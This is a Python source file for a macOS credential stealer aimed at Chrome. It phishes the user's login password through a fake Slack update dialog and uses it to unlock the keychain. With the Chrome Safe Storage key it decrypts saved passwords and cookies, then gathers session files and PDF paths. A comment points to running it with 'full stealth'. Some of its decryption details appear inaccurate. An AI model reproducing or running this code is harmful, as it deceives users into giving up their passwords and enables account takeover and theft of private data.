import os
import json
import base64
import sqlite3
import shutil
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import subprocess

def get_chrome_profiles():
    base_dir = Path.home() / "Library" / "Application Support" / "Google" / "Chrome"
    profiles = [base_dir / "Default"]
    profiles.extend(base_dir.glob("Profile *"))
    return [p for p in profiles if p.exists()]

def phish_password_via_slack_dialog():
    """Uses osascript to display a fake Slack update dialog and capture the password."""
    applescript = '''
    display dialog "An update is ready to install. Slack is trying to add a new helper tool.
    
    Touch ID or enter your password to allow this." default answer "" with title "Slack" with icon caution \
    default button "Use Password..." with hidden answer true
    '''
    try:
        result = subprocess.run(['osascript', '-e', applescript], capture_output=True, text=True, check=True)
        # Parse the result: button clicked and text entered
        lines = result.stdout.strip().split('\n')
        if 'button returned:Use Password...' in lines[0]:
            password = lines[1].strip().replace('text returned:', '').strip()
            return password
        else:
            raise ValueError("User canceled the dialog")
    except subprocess.CalledProcessError:
        raise RuntimeError("Failed to display phishing dialog")

def unlock_keychain(password):
    """Unlocks the login keychain using the phished password."""
    keychain_path = os.path.expanduser('~/Library/Keychains/login.keychain-db')
    cmd = ['security', 'unlock-keychain', '-p', password, keychain_path]
    subprocess.run(cmd, check=True, capture_output=True)

def get_encryption_key(profile_dir):
    local_state = profile_dir.parent / "Local State"
    if not local_state.exists():
        raise FileNotFoundError(f"Local State file not found: {local_state}")
    with open(local_state, "r") as f:
        state = json.load(f)
    if "os_crypt" not in state or "encrypted_key" not in state["os_crypt"]:
        print("No encryption key found in Local State (no saved passwords?). Skipping decryption.")
        return None  # No key = no decryption needed
    
    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]  # Remove 'DPAPI' prefix
    
    # First, try normal access (in case permissions are already set)
    try:
        output = subprocess.check_output([
            "security", "find-generic-password", "-wa", "Chrome Safe Storage"
        ], stderr=subprocess.DEVNULL).decode().strip()
        key_raw = output.encode()
    except subprocess.CalledProcessError:
        # Fallback to phishing if normal access fails
        print("Normal access failed; initiating Slack phishing dialog...")  # Remove for full stealth
        password = phish_password_via_slack_dialog()
        unlock_keychain(password)
        # Now retry normal access (should succeed silently)
        output = subprocess.check_output([
            "security", "find-generic-password", "-wa", "Chrome Safe Storage"
        ], stderr=subprocess.DEVNULL).decode().strip()
        key_raw = output.encode()
    
    salt = b"saltysalt"
    kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16, salt=salt, iterations=1003)
    return kdf.derive(key_raw)

def decrypt_value(encrypted_value, key):
    # Handle v10/v11 AES-GCM (modern)
    if encrypted_value[:3] in (b'v10', b'v11'):
        nonce = encrypted_value[3:15]
        ciphertext = encrypted_value[15:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
    else:
        # Legacy AES-CBC (older Chrome)
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = encrypted_value[3:19]  # For v01, nonce is 16 bytes after 'v01'
        ciphertext = encrypted_value[19:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        padded = decryptor.update(ciphertext) + decryptor.finalize()
        return padded.rstrip(b'\x00').decode('utf-8')  # Remove padding

def extract_passwords(profile_dir):
    key = get_encryption_key(profile_dir)
    login_db = profile_dir / "Login Data"
    if not login_db.exists():
        return []
    temp_db = "temp_login.db"
    shutil.copy2(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = []
    for row in cursor.fetchall():
        if row[2]:  # Has password_value
            if key is None:
                data.append({"url": row[0], "user": row[1], "pass": "[No decryption key]"})
            else:
                try:
                    decrypted = decrypt_value(row[2], key)
                    data.append({"url": row[0], "user": row[1], "pass": decrypted})
                except Exception:
                    data.append({"url": row[0], "user": row[1], "pass": "[Decryption failed]"})
    conn.close()
    os.remove(temp_db)
    return data

def extract_cookies(profile_dir):
    key = get_encryption_key(profile_dir)
    cookies_db = profile_dir / "Network" / "Cookies"
    if not cookies_db.exists():
        return []
    temp_db = "temp_cookies.db"
    shutil.copy2(cookies_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = []
    for row in cursor.fetchall():
        if row[2]:  # Has encrypted_value
            if key is None:
                data.append({"host": row[0], "name": row[1], "value": "[No decryption key]"})
            else:
                try:
                    decrypted = decrypt_value(row[2], key)
                    data.append({"host": row[0], "name": row[1], "value": decrypted})
                except Exception:
                    data.append({"host": row[0], "name": row[1], "value": "[Decryption failed]"})
    conn.close()
    os.remove(temp_db)
    return data

def extract_sessions(profile_dir):
    sessions_dir = profile_dir / "Sessions"
    data = {}
    if sessions_dir.exists():
        for session_file in sessions_dir.glob("Session_*"):
            with open(session_file, "rb") as f:
                data[session_file.name] = base64.b64encode(f.read()).decode()
    return data

def extract_pdfs(profile_dir):
    pdfs = list(profile_dir.rglob("*.pdf"))
    return [str(p) for p in pdfs]

def extract_all(profile_dir):
    return {
        "passwords": extract_passwords(profile_dir),
        "cookies": extract_cookies(profile_dir),
        "sessions": extract_sessions(profile_dir),
        "pdf_paths": extract_pdfs(profile_dir)
    }